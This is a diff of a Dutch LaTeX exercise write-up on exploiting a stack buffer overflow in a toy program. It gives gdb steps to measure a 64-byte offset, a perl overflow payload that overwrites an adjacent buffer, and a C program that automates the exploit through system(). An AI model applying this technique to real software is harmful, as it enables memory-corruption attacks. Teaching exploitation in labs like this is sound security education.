@@ -1,8 +1,77 @@
 \begin{enumerate}
-  \item 
+  \item gcc-3.3 -g -o gokkenvoorlosers gokkenvoorlosers.c
+  \item gdb -q gokkenvoorlosers
+  \item (gdb) list
+  	\begin{enumerate}
+  	\item Door dit commando uit te voeren krijgen we een overzicht van de programma code
+  	\item We zoeken de scharnierpunten in dit programma:
+  		\begin{enumerate}
+  		\item 1 argument: \textless bestandsnaam\textgreater
+  		\item output
+  		\item naam
+  		\item strcpy(naam, bestandsnaam) op lijn 22
+  		\item fprintf(fp, ...). De output wordt hier weggeschreven in gokverslaafden.txt
+  			\begin{enumerate}
+  			\item Initieel: docu ment	-10 000
+  			\end{enumerate}
+  		\end{enumerate}
+  	\end{enumerate}
+  \item (gdb) break 23
+  	\begin{enumerate}
+  	\item Adres van output bekijken
+  	\item Adres van naam bekijken
+  	\end{enumerate}
+  \item (gdb) run test
+  \item (gdb) x/x output
+  	\begin{enumerate}
+  	\item 0xbffff630
+  	\end{enumerate}
+  \item (gdb) x/x naam
+  	\begin{enumerate}
+  	\item 0xbffff5f0
+  	\end{enumerate}
+  \item (gdb) print 0xbffff630 - 0xbffff5f0
+  	\begin{enumerate}
+  	\item \$1 = 64
+  	\end{enumerate}
+  \item (gdb) run ``\$(perl -e `print ``A''x64 . ``test'' ')''
+  	\begin{enumerate}
+  	\item gokverslaafden.txt bevat nu ``test''
+  	\end{enumerate}
+  \item Succes! Nu moeten we een programma schrijven die dit automatiseert.
+  \item Een voorbeeld oplossing zou het volgende kunnen zijn:
 \end{enumerate}
 
 \begin{lstlisting}
+oplossing.c
+------------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+char outputString[] = "Naj ed Nam\t8 000\nnajrda saalk\t10\nNet Nuiq\t5";
+
+int main(int argc, int argv[]){
+	char command[200] = "./gokkenvoorlosers \"$(perl -e 'print \"\x41\"x64 . \"";
+
+	strcat(command, outputString);
+	strcat(command, "\"')\"");
+
+	system(command);
+}
+
+OUTPUT:
+	cat gokverslaafden.txt
+		Naj ed Nam		8 000
+		najrda saalk	10
+		Net Nuiq		5
+\end{lstlisting}
+
+\begin{lstlisting}
+gokkenvoorlosers.c
+------------------
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
